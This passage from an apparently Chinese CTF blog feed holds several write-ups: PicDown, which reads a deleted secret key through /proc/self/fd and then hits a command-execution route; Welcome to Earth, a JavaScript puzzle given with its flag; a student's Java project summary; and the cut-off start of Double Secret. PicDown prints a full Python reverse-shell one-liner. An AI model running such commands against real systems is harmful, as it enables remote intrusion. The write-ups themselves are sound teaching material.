SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8080</span>)</span><br></pre></td></tr></table></figure><h4><span id="分析">分析</span></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SECRET_FILE = <span class="string">&quot;/tmp/secret.txt&quot;</span></span><br><span class="line">f = <span class="built_in">open</span>(SECRET_FILE)</span><br><span class="line">SECRET_KEY = f.read().strip()</span><br><span class="line">os.remove(SECRET_FILE)</span><br></pre></td></tr></table></figure><p>打开<code>/tmp/secret.txt</code>，读入SECRET_KEY，并删除掉 （remove</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/no_one_know_the_manager&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">manager</span>():</span></span><br><span class="line">    key = request.args.get(<span class="string">&quot;key&quot;</span>)</span><br><span class="line">    print(SECRET_KEY)</span><br><span class="line">    <span class="keyword">if</span> key == SECRET_KEY:</span><br><span class="line">        shell = request.args.get(<span class="string">&quot;shell&quot;</span>)</span><br><span class="line">        os.system(shell)</span><br><span class="line">        res = <span class="string">&quot;ok&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res = <span class="string">&quot;Wrong Key!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure><p>需要用key来getshell</p><h4><span id="文件描述符fd">文件描述符fd</span></h4><blockquote><p>文件描述符：File descriptor,简称fd，当应用程序请求内核打开/新建一个文件时，内核会返回一个文件描述符用于对应这个打开/新建的文件，其fd本质上就是一个非负整数。实际上，它是一个索引值，指向内核为每一个进程所维护的该进程打开文件的记录表。当程序打开一个现有文件或者创建一个新文件时，内核向进程返回一个文件描述符。在程序设计中，一些涉及底层的程序编写往往会围绕着文件描述符展开。但是文件描述符这一概念往往只适用于UNIX、Linux这样的操作系统。</p></blockquote><p>当一个新进程建立时，此进程将默认有 0，1，2 的文件描述符</p><table><thead><tr><th>文件描述符</th><th>缩写</th><th>描述</th></tr></thead><tbody><tr><td>0</td><td>STDIN</td><td>标准输入</td></tr><tr><td>1</td><td>STDOUT</td><td>标准输出</td></tr><tr><td>2</td><td>STDERR</td><td>标准错误输出</td></tr></tbody></table><blockquote><p>其实我们与计算机之间的交互是我可以输入一些指令之后它给我一些输出。那么我们可以把上面表格中的文件描述符0理解为我和计算机交互时的输入，而这个输入默认是指向键盘的; 文件描述符1理解为我和计算机交互时的输出，而这个输出默认是指向显示器的；文件描述符2理解为我和计算机交互时，计算机出现错误时的输出，而这个输出默认是和文件描述符1指向一个位置;</p></blockquote><p>所以0，1，2一般会指向<strong>终端</strong></p><p>当这个进程去打开一个<strong>新的文件</strong>时：</p><blockquote><p>如果此时去打开一个新的文件，它的文件描述符会是 <strong>3</strong> 。POSIX 标准要求每次打开文件时（含socket）必须使用当前进程中最小可用的文件描述符号</p><p><strong>此文件描述符用来指定待读写的文件</strong></p></blockquote><p>​        <strong>而在进程的运行中，如果只是删除文件而不关闭(close)文件，此文件的文件描述符仍然存在，通过此访问符，依然可以访问到文件。</strong></p><h4><span id="获取key">获取key</span></h4><img src="/images/网鼎杯-2020-白虎组-PicDown/image-20210817183726750.png" alt="image-20210817183726750" style="zoom:80%;"><p>只打开了key文件，访问<strong>3</strong>即可读取到key</p><h4><span id="devfd">/dev/fd</span></h4><blockquote><ol><li><p>/dev/fd是一个虚拟的“东西”，它实际指向/proc/self/fd。里面存放的是某个program所打开的文件描述符。不同的program所看到的/proc/self/fd不同。比如同一个账号在不同tty登录同一台服务器，a看到的/proc/self/fd实际是/proc/8231/fd，而b看到的是/proc/14133/fd</p></li><li><p>/dev/fd里放的是文件描述符。默认的文件描述符有3个，0: stdin;1: stdout; 2: stderr。不同的program打开的文件描述符可能还不同。</p></li><li><p>当一个文件描述符被关闭后再被试图读写，就会报错。</p></li></ol></blockquote><p>这玩意似乎也行，是指向**/proc/self/fd**的……</p><p><img src="/images/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%99%BD%E8%99%8E%E7%BB%84-PicDown/image-20210817184042731.png" alt="image-20210817184042731"></p><p>也有解释称：/dev/fd[0-7]：标准软驱    ——<a href="https://www.cnblogs.com/sdu20112013/p/11313585.html">Linux /dev目录详解</a></p><p>啊……不是很懂</p><h4><span id="弹shell">弹shell</span></h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;xxxx&#x27;,6666));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></pre></td></tr></table></figure><p>参考文章:  </p><p><a href="https://blog.csdn.net/weixin_43610673/article/details/106196856?utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~BlogCommendFromBaidu~default-1.control">网鼎杯白虎组web - PicDown</a></p><p><a href="https://blog.csdn.net/SopRomeo/article/details/105653176">[V&amp;N2020 公开赛]CHECKIN</a></p><p><a href="https://www.linuxprobe.com/linux-proc-pid.html">简析Linux中 /proc/pid  目录的各文件</a></p><p><a href="%5Bhttp://www.itqiankun.com/article/file-fd#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%5D(http://www.itqiankun.com/article/file-fd#%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6)">彻底搞懂文件描述符fd</a></p><p><a href="https://www.jianshu.com/p/a2df1d402b4d">理解文件描述符</a></p><p><a href="https://www.cnblogs.com/sdu20112013/p/11313585.html">Linux /dev目录详解</a></p><p><a href="https://blog.csdn.net/njchina/article/details/49251499">/dev/fd 文件描述符</a></p><p><a href="https://blog.csdn.net/zhangpeterx/article/details/90672749">Linux: /dev/fd/详解</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;网鼎杯-2020-白虎组-PicDown&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>b01lers2020-Welcome-to-Earth</title>
    <link href="http://example.com/2021/08/16/b01lers2020-Welcome-to-Earth/"/>
    <id>http://example.com/2021/08/16/b01lers2020-Welcome-to-Earth/</id>
    <published>2021-08-16T07:56:47.733Z</published>
    <updated>2021-08-16T08:17:08.870Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>js 解密</p><a id="more"></a></blockquote><h5><span id="1-根界面">1. 根界面</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>AMBUSH!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>You&#x27;ve gotta escape!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.onkeydown = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        event = event || <span class="built_in">window</span>.event;</span></span><br><span class="line">        if (event.keyCode == 27) &#123;</span><br><span class="line">          event.preventDefault();</span><br><span class="line"><span class="javascript">          <span class="built_in">window</span>.location = <span class="string">&quot;/chase/&quot;</span>;</span></span><br><span class="line"><span class="javascript">        &#125; <span class="keyword">else</span> die();</span></span><br><span class="line">      &#125;;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">dietimer</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> sleep(<span class="number">10000</span>);</span></span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">die</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      dietimer();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在1s内逃跑</p><h5><span id="2-chase">2. /chase/</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>CHASE!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line">      You managed to chase one of the enemy fighters, but there&#x27;s a wall coming</span><br><span class="line">      up fast!</span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">   <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">dietimer</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> sleep(<span class="number">1000</span>);</span></span><br><span class="line">        die();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">die</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">left</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">leftt</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/leftt/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="function"><span class="keyword">function</span> <span class="title">right</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      dietimer();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>事件触发 leftt……</p><h5><span id="3-leftt">3. /leftt/</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>SHOOT IT<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>You&#x27;ve got the bogey in your sights, take the shot!<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    </span><br><span class="line">    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;window.location=&#x27;/die/&#x27;&quot;</span>&gt;</span>Take the shot<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- &lt;button onClick=&quot;window.location=&#x27;/shoot/&#x27;&quot;&gt;Take the shot&lt;/button&gt; --&gt;</span></span><br></pre></td></tr></table></figure><p>……</p><h5><span id="4-shoot">4. /shoot/</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>YOU SHOT IT DOWN!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>Well done! You also crash in the process<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;window.location=&#x27;/door/&#x27;&quot;</span>&gt;</span>Continue<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><h5><span id="5-door">5. /door/</span></h5><p>很多按钮……</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&quot;check_door()&quot;</span>&gt;</span>Check<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br></pre></td></tr></table></figure><p>点击触发事件，看引入的js文件</p><p>door.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_door</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> all_radio = <span class="built_in">document</span>.getElementById(<span class="string">&quot;door_form&quot;</span>).elements;</span><br><span class="line">  <span class="keyword">var</span> guess = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; all_radio.length; i++)</span><br><span class="line">    <span class="keyword">if</span> (all_radio[i].checked) guess = all_radio[i].value;</span><br><span class="line"></span><br><span class="line">  rand = <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * <span class="number">360</span>);</span><br><span class="line">  <span class="keyword">if</span> (rand == guess) <span class="built_in">window</span>.location = <span class="string">&quot;/open/&quot;</span>;</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">window</span>.location = <span class="string">&quot;/die/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5><span id="6-open">6. /open/</span></h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>YOU FOUND THE DOOR!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">p</span>&gt;</span>How do you open it?<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>直接看引入的js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sleep</span>(<span class="params">ms</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="params">resolve</span> =&gt;</span> <span class="built_in">setTimeout</span>(resolve, ms));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">open</span>(<span class="params">i</span>) </span>&#123;</span><br><span class="line">  sleep(<span class="number">1</span>).then(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">    open(i + <span class="number">1</span>);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">if</span> (i == <span class="number">4000000000</span>) <span class="built_in">window</span>.location = <span class="string">&quot;/fight/&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5><span id="7-fight">7. /fight/</span></h5><p>又是点击触发，js：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Run to scramble original flag</span></span><br><span class="line"><span class="comment">//console.log(scramble(flag, action));</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scramble</span>(<span class="params">flag, key</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; key.length; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> n = key.charCodeAt(i) % flag.length;</span><br><span class="line">    <span class="keyword">let</span> temp = flag[i];</span><br><span class="line">    flag[i] = flag[n];</span><br><span class="line">    flag[n] = temp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> action = <span class="built_in">document</span>.getElementById(<span class="string">&quot;action&quot;</span>).value;</span><br><span class="line">  <span class="keyword">var</span> flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> unscramble function</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>“混淆”了flag，直接手解：pctf{hey_boys_im_baaaaaaaaaack!}</p><p>大佬的 python 脚本解法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> permutations</span><br><span class="line"></span><br><span class="line">flag = [<span class="string">&quot;&#123;hey&quot;</span>, <span class="string">&quot;_boy&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;s_im&quot;</span>, <span class="string">&quot;ck!&#125;&quot;</span>, <span class="string">&quot;_baa&quot;</span>, <span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;pctf&quot;</span>]</span><br><span class="line"></span><br><span class="line">item = permutations(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> item:</span><br><span class="line">k = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(i))</span><br><span class="line"><span class="keyword">if</span> k.startswith(<span class="string">&#x27;pctf&#123;hey_boys&#x27;</span>) <span class="keyword">and</span> k[<span class="number">-1</span>] == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">print(k)</span><br></pre></td></tr></table></figure><p>用的全排列，🐂</p><p>参考文章:<br><a href="https://www.yuque.com/u390550/kdmol2/ul9gfw">qaq</a></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;js 解密&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>项目学习初期小节</title>
    <link href="http://example.com/2021/08/15/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/"/>
    <id>http://example.com/2021/08/15/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/</id>
    <published>2021-08-15T07:27:51.835Z</published>
    <updated>2021-08-23T08:05:36.032Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>摘要<br>实验室Java项目，学习小结</p><a id="more"></a><p>话说这是信息安全实验室的开发项目，emmm……</p></blockquote><blockquote><p>学习资源:<br><a href="https://www.bilibili.com/video/BV1CJ411m7gg">求知讲堂Java视频</a> (98/120)</p><p><a href="https://www.bilibili.com/video/BV18s411u7EH">JavaWeb视频教程</a> (31/68)</p><p><a href="https://www.bilibili.com/video/BV177411s7Lt">Electron免费视频教程-从基础到实战</a> (1/17)</p><p>完，写小结的时候感觉知识已经开始忘了……🤣</p></blockquote><blockquote><p><strong>描述</strong>：美容院管理系统</p><p><strong>初期目标</strong>：实现其中的商品管理系统，即增、删、改、查</p></blockquote><h4><span id="基础知识">基础知识：</span></h4><p><strong>Java基本知识的学习：</strong><a href="https://www.bilibili.com/video/BV1CJ411m7gg">求知讲堂Java视频</a> (98/120)</p><ul><li>情况：掌握了基本的语法，了解了一些设计模式，面向对象编程深入我心，还需学习面向接口编程，需要复习……</li></ul><p>等我学完，整理下笔记发出来吧……挺多的</p><p><strong>Javaweb知识学习：</strong><a href="https://www.bilibili.com/video/BV18s411u7EH">JavaWeb视频教程</a> (31/68)</p><ul><li>情况：纠结好久，决定从jsp开始。学习了jsp、JavaBean、jdbc、servlet、基础架构知识；本次项目也是跟着视频学到一定程度打出来的……</li></ul><p>目前无笔记……懒爆……想把Java基础先整好</p><p><strong>sql基础知识：</strong>无</p><ul><li>情况：……半吊子不如的水平，基本了解也是学习sql注入的时候知道的，也涉及不到复杂sql……反而实际的开发让我更加了解了普通的注入场景——预编译😑</li></ul><p>更加无笔记，学校计科专业甚至无数据库的课……</p><p><strong>前端基础知识：</strong></p><ul><li>情况：js学艺不精……之前看了十几节课，因有事而搁浅；css也学艺不精……目前是找到不错的模板，可以借助搜索引擎达到我想要的效果……刚刚能看懂的水平？</li></ul><p>害……</p><p><strong>Electron？</strong></p><ul><li>情况：只是为了便于浏览找到的客户端制作工具……<strong>只看了一集</strong>没什么好说的，<strong>js真心nb</strong>，我要好好学……还有<strong>python</strong>……感觉学不完了，我还<strong>天天玩</strong>🐕</li></ul><p>玩手机……嘿嘿🤤</p><h4><span id="项目介绍">项目介绍</span></h4><blockquote><p>开发工具：eclipse</p><p>服务器：tomcat</p><p>servlet：3.0</p><p>数据库：sqlite</p><p>桌面客户端：Electron</p><p>架构：——<strong>三层架构</strong>：</p><p>​                    –<strong>表示层</strong> ： 【前台】：jsp、css、js…… + 【后台】：servlet </p><p>​                    –<strong>业务逻辑层</strong>： service</p><p>​                    –<strong>数据访问层</strong>： Dao</p><p>现有功能：-对商品的增删改查</p><p>​                    -以商品编号为唯一主键进行统一管理</p></blockquote><p><img src="/images/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/clip_image002.jpg" alt="img"></p><h3><span id="项目部署">项目部署</span></h3><p><img src="/images/%E9%A1%B9%E7%9B%AE%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%9C%9F%E5%B0%8F%E8%8A%82/image-20210815184343455.png" alt="image-20210815184343455"></p><ul><li>run.exe由test.vbs编译而来</li><li>test.vbs无窗口调用test.bat</li><li>bat依次设置环境变量、启动tomcat、启动electron</li></ul><p>部署细节：</p><ul><li>默认服务开在8888端口</li><li>会在D盘下生成project.db作为数据库</li><li>服务关闭需关闭 javaw 服务 与 electron</li><li>条件符合解压后即可使用</li></ul><h4><span id="项目初期演示">项目初期演示</span></h4><div style="width:100%;height:0px;position:relative;padding-bottom:56.327%;"><iframe src="https://streamja.com/embed/JLP6G" frameborder="0" width="100%" height="100%" allowfullscreen style="width:100%;height:100%;position:absolute;"></iframe></div><blockquote><p>qq录屏格式不对，由碰上断网……整了老半天……无语</p><p>想用七牛云做个图床，结果要备案域名，至少要七天…… 免费图床+streamja就挺香的，不知道费半天劲干什么🙄</p></blockquote>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;摘要&lt;br&gt;实验室Java项目，学习小结&lt;/p&gt;</summary>
    
    
    
    <category term="web" scheme="http://example.com/categories/web/"/>
    
    
    <category term="buuctf" scheme="http://example.com/tags/buuctf/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019-华东南赛区-Double-Secret</title>
    <link href="http://example.com/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/"/>
    <id>http://example.com/2021/05/14/CISCN2019-%E5%8D%8E%E4%B8%9C%E5%8D%97%E8%B5%9B%E5%8C%BA-Double-Secret/</id>
    <published>2021-05-14T06:28:06.000Z</published>
    <updated>2021-08-23T08:05:36.036Z</updated>
    
    <content type="html"><![CDATA[<h3><span id="ciscn2019-华东南赛区double-secret">[CISCN2019 华东南赛区]Double Secret</span></h3><p>Welcome To Find Secret</p><p>记录一下……</p><p>寻找secret……扫不出后台，robots页面似乎没什么用……</p><p>尝试发现secret页面：</p><img src="/images/CISCN2019-华东南赛区-Double-Secret/image-20210514143307636.png" alt="image-20210514143307636" style="zoom:80%;"><p>提交参数secret：</p><p>随便输入报错：</p><img src="/images/CISCN2019-华东南赛区-Double-Secret/image-20210514143408872.png" alt="image-20210514143408872" style="zoom:80%;"><p>rc4似乎是需要密钥的一种加密，猜测此处暴漏了密钥</p><p>并且解密后进行模板渲染，flask，模板注入……</p><p>记录下脚本与用法……本地报错，搞了好长时间，输出又不对</p><p>拉到kali中，安装python3可以运行……很迷……</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 